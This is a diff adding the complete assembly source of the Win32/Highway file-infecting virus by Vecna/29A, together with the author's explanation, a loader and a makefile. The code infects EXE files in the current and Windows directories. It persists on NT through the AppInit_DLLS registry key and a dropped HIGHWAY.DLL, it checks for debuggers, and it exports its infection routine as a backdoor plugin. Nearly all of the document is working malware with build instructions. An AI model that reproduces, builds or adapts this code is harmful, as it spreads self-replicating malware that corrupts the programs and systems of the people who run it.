@@ -1,0 +1,834 @@
+Win32/Highway by Vecna/29A
+version 2
+
+This is my first fully w32 compatible virus, and is a resident WinNT infector
+and a direct action w9x and w32s infector. This happen becoz the registry key
+that we use to go memory resident only exists under WinNT.
+
+When a infected file is run, the virus obtain GetProcAddress and GetModHandle
+directly from the host import table; we overwrite 2 RVA to API names in KERNEL
+descriptor with RVAs to our ones(GetProcAddress and GetModHandle). When the
+file is loaded, these APIs are ready for us, and we restore the old APIs using
+they(and skipping the ordinal, that was the first thing at the original RVA).
+This make us compatible with all w32 systems.
+
+The virus then copy itself to a file called HIGHWAY.DLL in windows system dir,
+and create a special key in the registry. The DLL is just the appended virus
+code, as the virus use the same format, a DLL, in the viral DLL and in infect
+files. Just the entrypoint is diferent in each case.
+
+Then the virus try to infect all EXE files in current directory and in windows
+directory. Files divisable by 101 without remainder are considered infected.
+The virus also dont infect others DLLs and file without any import from KERNEL,
+a very rare fact(at least ExitProcess must be imported!).
+
+In w9x and w32s systems, the lifecicle of the virus is complete then. But under
+WinNT, in next reboot, our key will start to work.
+
+All files loaded will have mapped, in their users space, the viral DLL, due the
+effects of this registry key. When DllMain of our DLL is called, the virus
+infect the current directory. Thus, all executed files in WinNT will trigger
+the infection of their base directory.
+
+The DLL then return 0, that mean to dont load the DLL. The infection routine
+is also exported in the DLL, thus making the virus usable as a BO-plugin.
+
+To compile the virus:
+*separate this file in the individual files.
+*type MAKE(you need 29A include files).
+
+;----------------------------(HIGHWAY.ASM)------------------------------------
+;110, 120, 160
+;S¢ pra ver at‚ quando,
+;o motor do carro aguenta.
+;Na boca ao inves de um beijo,
+;um chicle de menta.
+;E a sombra de um sorriso que eu deixei,
+;numa das curvas da highway.
+
+.386p
+.model flat
+locals
+.xlist
+    include mz.inc
+    include pe.inc
+    include useful.inc
+    include win32api.inc
+.list
+
+.data
+
+copyright  db 'Ser  a estrada uma pris„o?', 0
+
+mem        dd 0
+
+MapHandle  dd 0
+MapSize    dd 0
+MapMapping dd 0
+MapAddress dd 0
+
+ImportDescriptor dd 0
+
+buffer     db MAX_PATH dup (0)
+DirBuffer  db MAX_PATH dup (0)
+finddata   WIN32_FIND_DATA <0>
+
+.code
+
+DEBUG              EQU FALSE
+CHANGEDIR          EQU TRUE
+REGISTER           EQU TRUE
+
+DIV_VALUE          EQU 101
+MINSIZE            EQU 16*1024
+WORKSIZE           EQU 16*1024
+DLLSIZE            EQU 8192
+ENTRY              EQU 1536
+KEY_ALL_ACCESS     EQU 000F003Fh
+HKEY_LOCAL_MACHINE EQU 80000002H
+
+ofs equ offset
+dwo equ dword ptr
+wo  equ word ptr
+by  equ byte ptr
+
+       extrn SetFileAttributesA  :PROC
+       extrn GetModuleFileNameA  :PROC
+       extrn CreateFileA         :PROC
+       extrn CloseHandle         :PROC
+       extrn CreateFileMappingA  :PROC
+       extrn MapViewOfFile       :PROC
+       extrn UnmapViewOfFile     :PROC
+       extrn VirtualAlloc        :PROC
+       extrn VirtualFree         :PROC
+       extrn GetSystemDirectoryA :PROC
+       extrn GetWindowsDirectoryA:PROC
+       extrn GetFileSize         :PROC
+       extrn SetFilePointer      :PROC
+       extrn SetEndOfFile        :PROC
+       extrn ReadFile            :PROC
+       extrn FindFirstFileA      :PROC
+       extrn FindNextFileA       :PROC
+       extrn FindClose           :PROC
+       extrn IsBadCodePtr        :PROC
+       extrn SetFileTime         :PROC
+       extrn SetCurrentDirectoryA:PROC
+       extrn GetCurrentDirectoryA:PROC
+
+vcode equ this byte
+
+ExeEntry proc
+IF DEBUG EQ TRUE
+       int 3
+ENDIF
+       call @@2
+       mov esp,[esp.EH_EstablisherFrame]
+       jmp @@3
+  @@2:
+       xor edx,edx
+       push dwo fs:[edx]
+       mov fs:[edx],esp                        ;set SEH frame
+       call @@0
+  @@0:
+       pop ebp
+       sub ebp, ofs @@0-ofs ExeEntry
+       call GetProcz                           ;get all needed APIs
+       mov eax, dwo [ebp.(ofs _IsDebuggerPresent-ofs vcode)]
+       test eax, eax
+       jz @@1                                  ;w9x machine, dont check
+       call dwo [ebp.(ofs _IsDebuggerPresent-ofs vcode)]
+       jnz @@3                                 ;NT debugger? go out
+  @@1:
+       push MAX_PATH
+       lea eax, [ebp.(ofs DynBuffer-ofs vcode)]
+       push eax
+       call dwo [ebp.(ofs _GetSystemDirectoryA-ofs vcode)]
+       cld
+       lea esi, [ebp.(ofs DynBuffer-ofs vcode)]
+       @endsz
+       dec esi
+       mov edi, esi
+       @pushsz '\HIGHWAY.DLL'
+       pop esi
+       @copysz
+       push NULL
+       push FILE_ATTRIBUTE_NORMAL
+       push CREATE_ALWAYS
+       push NULL
+       push NULL
+       push GENERIC_READ.GENERIC_WRITE
+       lea eax, [ebp.(ofs DynBuffer-ofs vcode)]
+       push eax
+       call [ebp.(ofs _CreateFileA-ofs vcode)] ;create DLL
+       cmp eax, INVALID_HANDLE_VALUE
+       je @@3
+       mov ebx, eax
+       push NULL
+       @pushsz 'FREE'
+       push DLLSIZE
+       lea edx, [ebp-ENTRY]
+       push edx
+       push ebx
+       call [ebp.(ofs _WriteFile-ofs vcode)]   ;write DLL body!
+       push ebx
+       call [ebp.(ofs _CloseHandle-ofs ExeEntry)]
+IF REGISTER EQ TRUE
+       @pushsz 'FREE'
+       lea eax, [ebp.(ofs khandle-ofs vcode)]
+       push eax
+       push NULL
+       push KEY_ALL_ACCESS
+       push NULL
+       push NULL
+       push NULL
+       @pushsz 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'
+       push HKEY_LOCAL_MACHINE                 ;create self-loading key
+       call [ebp.(ofs _RegCreateKeyExA-ofs vcode)]
+       test eax, eax
+       jnz @@3
+       push 12
+       @pushsz 'HIGHWAY.DLL'
+       push 1
+       push NULL
+       @pushsz 'AppInit_DLLS'
+       mov eax, [ebp.(ofs khandle-ofs vcode)]
+       push eax                                ;set it to our DLL
+       call [ebp.(ofs _RegSetValueExA-ofs vcode)]
+       mov eax, [ebp.(ofs khandle-ofs vcode)]
+       push eax
+       call [ebp.(ofs _RegCloseKey-ofs vcode)]
+ENDIF
+       @pushsz 'HIGHWAY.DLL'                   ;infect current directory
+       call [ebp.(ofs _LoadLibraryA-ofs vcode)]
+  @@3:
+       @SEH_RemoveFrame
+       db 0e9h
+ExeEntry endp
+
+oeip   dd -1
+
+GetProcz proc
+       pusha
+       call delta
+  delta:
+       pop edx
+       sub edx, 12345678h                      ;edx=base
+  hbase equ dwo $-4
+       mov esi, [ebp.(ofs RVAImport-ofs vcode)]
+       add esi, edx
+       mov edi, esi                            ;get GetModuleHandleA from
+       lodsd                                   ;host import table!
+       mov [ebp.(ofs _GetModuleHandle-ofs vcode)], eax
+       lodsd                                   ;get GetProcAddress too
+       mov [ebp.(ofs _GetProcAddress-ofs vcode)], eax
+       push edx
+       push edx
+       @pushsz 'KERNEL32'
+       call [ebp.(ofs _GetModuleHandle-ofs vcode)]
+       mov ebx, eax
+       pop eax
+       add eax, [ebp.(ofs FirstAPI-ofs vcode)]
+       add eax, 2                              ;skip ordinal order
+       push eax
+       push ebx
+       call [ebp.(ofs _GetProcAddress-ofs vcode)]
+       stosd                                   ;restore API requested by host
+       pop edx
+       add edx, [ebp.(ofs SecondAPI-ofs vcode)]
+       add edx, 2
+       push edx
+       push ebx
+       call [ebp.(ofs _GetProcAddress-ofs vcode)]
+       stosd                                   ;restore the 2nd one too
+       @pushsz 'GetSystemDirectoryA'
+       push ebx
+       call [ebp.(ofs _GetProcAddress-ofs vcode)]
+       mov [ebp.(ofs _GetSystemDirectoryA-ofs vcode)], eax
+       @pushsz 'CreateFileA'
+       push ebx
+       call [ebp.(ofs _GetProcAddress-ofs vcode)]
+       mov [ebp.(ofs _CreateFileA-ofs vcode)], eax
+       @pushsz 'CloseHandle'
+       push ebx
+       call [ebp.(ofs _GetProcAddress-ofs vcode)]
+       mov [ebp.(ofs _CloseHandle-ofs vcode)], eax
+       @pushsz 'WriteFile'
+       push ebx
+       call [ebp.(ofs _GetProcAddress-ofs vcode)]
+       mov [ebp.(ofs _WriteFile-ofs vcode)], eax
+       @pushsz 'LoadLibraryA'
+       push ebx
+       call [ebp.(ofs _GetProcAddress-ofs vcode)]
+       mov [ebp.(ofs _LoadLibraryA-ofs vcode)], eax
+       @pushsz 'IsDebuggerPresent'
+       push ebx                                ;this API only exists in winNT
+       call [ebp.(ofs _GetProcAddress-ofs vcode)]
+       mov [ebp.(ofs _IsDebuggerPresent-ofs vcode)], eax
+IF REGISTER EQ TRUE
+       @pushsz 'ADVAPI32'
+       call [ebp.(ofs _GetModuleHandle-ofs vcode)]
+       mov ebx, eax
+       @pushsz 'RegCloseKey'
+       push ebx
+       call [ebp.(ofs _GetProcAddress-ofs vcode)]
+       mov [ebp.(ofs _RegCloseKey-ofs vcode)], eax
+       @pushsz 'RegCreateKeyExA'
+       push ebx
+       call [ebp.(ofs _GetProcAddress-ofs vcode)]
+       mov [ebp.(ofs _RegCreateKeyExA-ofs vcode)], eax
+       @pushsz 'RegSetValueExA'
+       push ebx
+       call [ebp.(ofs _GetProcAddress-ofs vcode)]
+       mov [ebp.(ofs _RegSetValueExA-ofs vcode)], eax
+ENDIF
+       popa
+       ret
+GetProcz endp
+
+public DllEntry
+
+DllEntry proc STDCALL
+IF DEBUG EQ TRUE
+       int 3
+ENDIF
+       pusha
+       push PAGE_READWRITE
+       push MEM_COMMIT.MEM_RESERVE
+       push DLLSIZE
+       push NULL
+       call VirtualAlloc
+       mov [mem], eax
+       test eax, eax
+       jz @@1
+       push MAX_PATH
+       push ofs buffer
+       call GetSystemDirectoryA
+       cld
+       mov esi, ofs buffer
+       @endsz
+       dec esi
+       mov edi, esi
+       @pushsz  '\HIGHWAY.DLL'
+       pop esi
+       @copysz
+       push NULL
+       push FILE_ATTRIBUTE_NORMAL
+       push OPEN_EXISTING
+       push NULL
+       push FILE_SHARE_READ
+       push GENERIC_READ
+       push ofs buffer
+       call CreateFileA
+       cmp eax, INVALID_HANDLE_VALUE
+       je @@0
+       mov ebx, eax
+       push NULL
+       @pushsz 'FREE'
+       push DLLSIZE
+       push dwo [mem]
+       push ebx
+       call ReadFile                           ;read DLL to buffer
+       push ebx
+       call CloseHandle
+       push MAX_PATH
+       push ofs buffer
+       push NULL
+       call GetModuleFileNameA
+       call ProcessDirectory                   ;infect current directory
+IF CHANGEDIR EQ TRUE
+       push ofs DirBuffer
+       push MAX_PATH
+       call GetCurrentDirectoryA               ;save current directory
+       test eax, eax
+       jz @@0
+       push MAX_PATH
+       push ofs buffer
+       call GetWindowsDirectoryA
+       test eax, eax
+       jz @@0
+       push ofs buffer
+       call SetCurrentDirectoryA
+       test eax, eax
+       jz @@0
+       cld
+       mov esi, ofs buffer
+       @endsz
+       mov wo [esi-1], '\'
+       call ProcessDirectory                   ;infect /windows/
+       push ofs DirBuffer
+       call SetCurrentDirectoryA               ;restore home directory
+ENDIF
+  @@0:
+       push MEM_DECOMMIT.MEM_RELEASE
+       push NULL
+       push dwo [mem]
+       call VirtualFree
+  @@1:
+       popa
+       sub eax, eax                            ;ERROR_NO_LOAD
+       ret 12
+DllEntry endp
+
+ProcessDirectory proc
+       mov esi, ofs buffer
+  @@3:
+       lodsb
+       cmp al, '\'
+       jne @@0
+       mov edi, esi
+  @@0:
+       or al, al
+       jnz @@3
+       mov eax, 'XE.*'
+       stosd
+       mov eax, 'E'                            ;make wildcard
+       stosd
+       push ofs finddata
+       push ofs buffer
+       call FindFirstFileA
+       cmp eax, INVALID_HANDLE_VALUE
+       je @@1
+  @@2:
+       push eax
+       push ofs finddata
+       push eax
+       lea edx, [finddata.WFD_szFileName]
+       push edx
+       call Infect                             ;process file
+       call FindNextFileA
+       test eax, eax
+       pop eax
+       jnz @@2
+       push eax
+       call FindClose
+  @@1:
+       ret
+ProcessDirectory endp
+
+public Infect
+
+Infect proc
+       mov edx, [esp.Arg1]
+       pusha
+       call @@4
+       mov esp,[esp.EH_EstablisherFrame]
+       jmp @@2
+  @@4:
+       push dwo fs:[0]
+       mov fs:[0],esp                          ;set SEH
+       call MapFile
+       jc @@2
+       mov edi, [MapAddress]
+       push edi
+       call IsBadCodePtr
+       cmp eax, NULL                           ;check if mapping failed
+       jne @@2
+       cmp [edi.MZ_magic], IMAGE_DOS_SIGNATURE
+       jne @@0
+       add edi, [edi.MZ_lfanew]
+       mov esi, edi
+       push esi
+       call IsBadCodePtr
+       cmp eax, NULL                           ;check if not new exe file
+       jne @@0
+       cmp [esi.NT_Signature], IMAGE_NT_SIGNATURE
+       jne @@0
+       cmp [esi.NT_FileHeader.FH_Machine], IMAGE_FILE_MACHINE_I386
+       jne @@0
+       cmp [esi.NT_OptionalHeader.OH_Magic], IMAGE_NT_OPTIONAL_HDR_MAGIC
+       jne @@0
+;       test [esi.NT_FileHeader.FH_Characteristics], IMAGE_FILE_EXECUTABLE_IMAGE
+;       jz @@0
+       bt [esi.NT_FileHeader.FH_Characteristics], 1
+       jnc @@0
+;       test [esi.NT_FileHeader.FH_Characteristics], IMAGE_FILE_DLL
+;       jnz @@0
+       bt [esi.NT_FileHeader.FH_Characteristics], 13
+       jc @@0
+       movzx eax, wo [esi.NT_FileHeader.FH_NumberOfSections]
+       test eax, eax
+       jz @@0
+       call SetupImports                       ;examine import table of host
+       jc @@0                                  ;and set needed values
+       dec eax
+       xor edx, edx
+       mov ecx, IMAGE_SIZEOF_SECTION_HEADER
+       mul ecx
+       add edi, eax
+       add edi, IMAGE_SIZEOF_NT_OPTIONAL_HEADER.IMAGE_SIZEOF_FILE_HEADER.4
+       mov eax, [edi.SH_VirtualSize]
+       mov ecx, [edi.SH_SizeOfRawData]
+       add dwo [edi.SH_VirtualSize], DLLSIZE   ;increase last section
+       add dwo [edi.SH_SizeOfRawData], DLLSIZE
+       add dwo [esi.NT_OptionalHeader.OH_SizeOfImage], DLLSIZE
+       cmp eax, ecx
+       jnb @@1
+       xchg eax, ecx
+  @@1:
+       mov ecx, eax
+       add eax, [edi.SH_VirtualAddress]
+       add ecx, [edi.SH_PointerToRawData]
+       mov [MapSize], ecx
+       add [MapSize], DLLSIZE
+       add eax, ENTRY
+       mov [edi.SH_Characteristics], IMAGE_SCN_CNT_INITIALIZED_DATA . \
+                                     IMAGE_SCN_MEM_READ             . \
+                                     IMAGE_SCN_MEM_WRITE
+       mov ebx, [esi.NT_OptionalHeader.OH_AddressOfEntryPoint]
+       mov [esi.NT_OptionalHeader.OH_AddressOfEntryPoint], eax
+       push eax
+       add eax, ofs delta-ofs vcode
+       push eax
+       mov eax, [esp.4]                        ; ;-)
+       add eax, (ofs oeip-ofs vcode).4
+       sub eax, ebx                            ;calculate entrypoint
+       neg eax
+       mov esi, [mem]
+       mov [esi.ENTRY.(ofs oeip-ofs vcode)], eax
+       pop eax
+       mov [esi.ENTRY.(ofs hbase-ofs vcode)], eax
+       push esi
+       push ecx
+       lea edi, [esi.ENTRY.(ofs RAWImport-ofs vcode)]
+       mov esi, ofs RAWImport
+       mov ecx, 5
+       cld
+       rep movsd                               ;copy info between dll->exe
+       pop ecx
+       pop esi
+       mov edi, ecx
+       add edi, [MapAddress]
+       mov ecx, DLLSIZE/4
+       rep movsd                               ;append virus body
+       mov edi, [RAWImport]
+       mov ebx, [RAWHint]
+       test ebx, ebx
+       jnz @@3                                 ;if HintTable dont exists,
+       mov ebx, edi                            ;use same pointer
+  @@3:
+       pop ecx
+       mov eax, ecx
+       add eax, (ofs hGetModuleHandleA-ofs vcode)
+       stosd
+       mov [ebx], eax                          ;insert 1th import!!!
+       mov eax, ecx
+       add eax, (ofs hGetProcAddress-ofs vcode)
+       stosd
+       mov [ebx.4], eax                        ;insert 2nd import!!!
+  @@0:
+       call UnmapFile
+  @@2:
+       @SEH_RemoveFrame
+       popa
+       ret 4                                   ;clean pushed paramz
+Infect endp
+
+RVA2RAW proc
+       pusha
+       mov esi, [MapAddress]
+       add esi, [esi.MZ_lfanew]
+       add esi, IMAGE_SIZEOF_NT_OPTIONAL_HEADER.IMAGE_SIZEOF_FILE_HEADER.4
+  @@1:
+       mov ebx, eax
+       sub ebx, [esi.SH_VirtualAddress]
+       cmp ebx, [esi.SH_VirtualSize]
+       jb @@0
+       add esi, IMAGE_SIZEOF_SECTION_HEADER    ;next section
+       jmp @@1
+  @@0:
+       add ebx, [esi.SH_PointerToRawData]      ;transform in file pointer
+       mov [esp.Pushad_eax], ebx
+       popa
+       ret
+RVA2RAW endp
+
+SetupImports proc
+       pusha
+       mov ecx, [esi.NT_OptionalHeader.OH_DirectoryEntries.DE_Import \
+                 .DD_Size]
+       test ecx, ecx
+       jz @@0                                  ;no importz?
+       mov eax, [esi.NT_OptionalHeader.OH_DirectoryEntries.DE_Import \
+                 .DD_VirtualAddress]
+       call RVA2RAW
+       mov edx, [MapAddress]
+       add eax, edx
+  @@3:
+       mov ecx, [eax.ID_Name]
+       test ecx, ecx
+       jz @@0                                  ;end of array?
+       push eax
+       mov eax, ecx
+       call RVA2RAW
+       mov eax, [eax.edx]
+       and eax, not 20202020h
+       cmp eax, 'NREK'                         ;are imports from KERNEL32??
+       pop eax
+       je @@2
+       add eax, IMAGE_SIZEOF_IMPORT_DESCRIPTOR ;check next DLL
+       jmp @@3
+  @@2:
+       sub ebx, ebx
+       mov [ImportDescriptor], eax
+       push eax
+       mov eax, [eax.ID_Characteristics]
+       mov [RVAHint], eax
+       test eax, eax
+       jz @@6
+       call RVA2RAW
+       add eax, edx                            ;get RVA&RAW of HintTable
+  @@6:
+       mov [RAWHint], eax
+       pop eax
+       mov ecx, [eax.ID_FirstThunk]
+       mov [RVAImport], ecx
+       jecxz @@0
+       mov eax, ecx
+       call RVA2RAW
+       add eax, edx
+       mov [RAWImport], eax                    ;get RVA&RAW of first chunk
+  @@7:
+       mov esi, eax
+       mov edi, ofs FirstAPI
+       lodsd
+       stosd
+       test eax, eax                           ;w9x bound or ordinal?
+       jz @@0
+       add eax, 100000h                        ;NT bound?
+       or eax, eax
+       jns @@4
+  @@5:
+       or ebx, ebx
+       jnz @@0                                 ;already tried to unbound?
+       mov eax, [RAWHint]
+       test eax, eax
+       jz @@0
+       mov [RAWImport], eax                    ;unbound(hinttable=first chunk)
+       push eax
+       mov eax, [RVAHint]
+       mov [RVAImport], eax
+       mov ebx, [ImportDescriptor]
+       sub eax, eax
+       mov [ebx.ID_TimeDateStamp], eax         ;zero date/time of dll
+       xchg eax, [ebx.ID_Characteristics]
+       mov [ebx.ID_FirstThunk], eax            ;put FirstChunk=HintTable and
+       pop eax                                 ;HintTable=0
+       jmp @@7
+  @@4:
+       lodsd
+       stosd                                   ;process 2nd import(only 2 are
+       test eax, eax                           ;needed by virus)
+       jz @@0
+       add eax, 100000h
+       or eax, eax
+       js @@5
+  @@1:
+       clc
+       db 0b1h                                 ;mov cl, ? ;-)
+  @@0:
+       stc                                     ;error in imports, no infect
+       popa
+       ret
+SetupImports endp
+
+MapFile proc
+       pusha
+       push FILE_ATTRIBUTE_NORMAL
+       push edx
+       call SetFileAttributesA
+       or eax, eax
+       jz @@1
+       push NULL
+       push FILE_ATTRIBUTE_NORMAL
+       push OPEN_EXISTING
+       push NULL
+       push FILE_SHARE_READ
+       push GENERIC_WRITE+GENERIC_READ
+       push dwo [esp.Pushad_edx.(6*4)]
+       call CreateFileA
+       cmp eax, INVALID_HANDLE_VALUE
+       je _restoreattr
+       mov [MapHandle], eax
+       push NULL
+       push dwo [MapHandle]
+       call GetFileSize
+       mov [MapSize], eax
+       cmp eax, MINSIZE
+       jb _closefile
+       test eax, eax
+       js _closefile
+       push ecx
+       push edx
+       push eax
+       mov ecx, DIV_VALUE
+       xor edx, edx
+       div ecx
+       or edx, edx
+       pop eax
+       pop edx
+       pop ecx
+       jz _closefile
+       add eax, WORKSIZE
+       push NULL
+       push eax
+       push NULL
+       push PAGE_READWRITE
+       push NULL
+       push dwo [MapHandle]
+       call CreateFileMappingA
+       or eax, eax
+       jz _closefile
+       mov [MapMapping], eax
+       push NULL
+       push NULL
+       push NULL
+       push FILE_MAP_ALL_ACCESS
+       push dwo [MapMapping]
+       call MapViewOfFile
+       or eax, eax
+       je _closemap
+       mov [MapAddress], eax
+       clc
+       db 0b1h
+  @@1:
+       stc
+       popa
+       ret
+MapFile endp
+
+UnmapFile proc
+       pusha
+       push dwo [MapAddress]
+       call UnmapViewOfFile
+  _closemap:
+       push dwo [MapMapping]
+       call CloseHandle
+       push NULL
+       push NULL
+       mov eax, [MapSize]
+       mov ecx, DIV_VALUE
+       xor edx, edx
+       div ecx
+       inc eax
+       mul ecx
+       push eax
+       push dwo [MapHandle]
+       call SetFilePointer
+       push dwo [MapHandle]
+       call SetEndOfFile
+       std
+       lea edi, [finddata.WFD_ftLastWriteTime.FT_dwLowDateTime]
+       push edi
+       scasd
+       scasd
+       push edi
+       scasd
+       scasd
+       push edi
+       push dwo [MapHandle]
+       call SetFileTime
+  _closefile:
+       push dwo [MapHandle]
+       call CloseHandle
+  _restoreattr:
+       push [finddata.WFD_dwFileAttributes]
+       lea eax, [finddata.WFD_szFileName]
+       push eax
+       call SetFileAttributesA
+       popa
+       ret
+UnmapFile endp
+
+hGetModuleHandleA    dw 029Ah
+                     db 'GetModuleHandleA', 0
+
+hGetProcAddress      dw 0000h
+                     db 'GetProcAddress', 0
+
+_GetModuleHandle     dd 0
+_GetProcAddress      dd 0
+
+_GetSystemDirectoryA dd 0
+_CreateFileA         dd 0
+_CloseHandle         dd 0
+_WriteFile           dd 0
+_LoadLibraryA        dd 0
+_IsDebuggerPresent   dd 0
+IF REGISTER EQ TRUE
+_RegCloseKey         dd 0
+_RegCreateKeyExA     dd 0
+_RegSetValueExA      dd 0
+
+khandle              dd 0
+ENDIF
+
+RAWHint              dd 0
+RVAHint              dd 0
+
+RAWImport            dd 0
+RVAImport            dd 0
+
+FirstAPI             dd 0
+SecondAPI            dd 0
+
+DynBuffer            db MAX_PATH dup(0)
+
+End    DllEntry
+
+;----------------------------(HIGHWAY.DEF)------------------------------------
+LIBRARY      HIGHWAY
+
+DESCRIPTION  'Assembly Win32 DLL-Based Virus'
+
+EXETYPE      WINDOWS
+
+CODE         PRELOAD
+DATA         PRELOAD SINGLE
+
+EXPORTS      DllEntry
+             Infect
+
+;-----------------------------(LOADER.ASM)------------------------------------
+;Execute LOADER.EXE to make the virus execute for first time.
+;All file in current directory and windows directory will be infected then.
+;This first generation loader dont work under w32s!
+.386p
+.model flat
+.data
+dllname db 'HIGHWAY.DLL', 0
+
+.code
+
+       extrn LoadLibraryA:PROC
+       extrn ExitProcess:PROC
+       extrn GetModuleHandleA:PROC
+       extrn GetProcAddress:PROC
+
+main:
+       mov eax, offset dllname
+       push eax
+       call LoadLibraryA
+       push 0
+       call ExitProcess
+
+end main
+
+;------------------------------(MAKEFILE)-------------------------------------
+DLLFLAG=/c /Tpd /s
+ASMFLAG=/l /m /ml /z /zi
+
+all : highway.dll loader.exe
+
+highway.dll : highway.obj
+     tlink32 $(DLLFLAG) highway.obj,highway.dll,highway.map,import32.lib,highway.def
+     pewrsec highway.dll
+     tdump -R -v highway.dll highway.dmp
+
+highway.obj : highway.asm
+     tasm32 $(ASMFLAG) highway.asm,highway.obj,highway.lst,highway.xrf
+
+loader.exe : loader.obj
+     tlink32 -c -Tpe -x loader.obj,loader.exe,,import32.lib
+
+loader.obj : loader.asm
+     tasm32 $(ASMFLAG) loader.asm,loader.obj,loader.lst,loader.xrf
